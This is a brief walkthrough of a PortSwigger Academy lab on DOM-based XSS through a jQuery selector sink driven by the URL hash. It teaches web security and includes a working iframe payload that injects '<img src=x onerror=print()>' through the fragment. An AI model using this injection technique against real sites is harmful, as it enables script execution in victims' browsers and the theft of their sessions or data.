# Lab: DOM XSS in jQuery selector sink using a hashchange event

**Official lab:** [https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)

## Lab idea

A value from the URL fragment is passed to jQuery’s selector logic to locate and scroll to a post after a hash change. It practices recognizing DOM sources beyond query parameters and libraries that interpret strings as selectors or markup.

## Vulnerability in brief
Cross-site scripting (XSS) is a web security vulnerability in which an application causes attacker-controlled content to be interpreted as executable script in a user’s browser. The code runs in the vulnerable site’s origin, so it can interfere with the victim’s interaction with that application and may access data or perform actions available to that user.

## Solution idea
1. Notice the vulnerable code on the home page using Burp or the browser's DevTools.
2. From the lab banner, open the exploit server.
3. In the Body section, add the following malicious iframe : <iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
4. Store the exploit, then click View exploit to confirm that the print() function is called.
5. Go back to the exploit server and click Deliver to victim to solve the lab.

## Payloads / key values
- `iframe`
- `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>`
- `print()`

## Official source
- [PortSwigger Academy: Lab: DOM XSS in jQuery selector sink using a hashchange event](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)
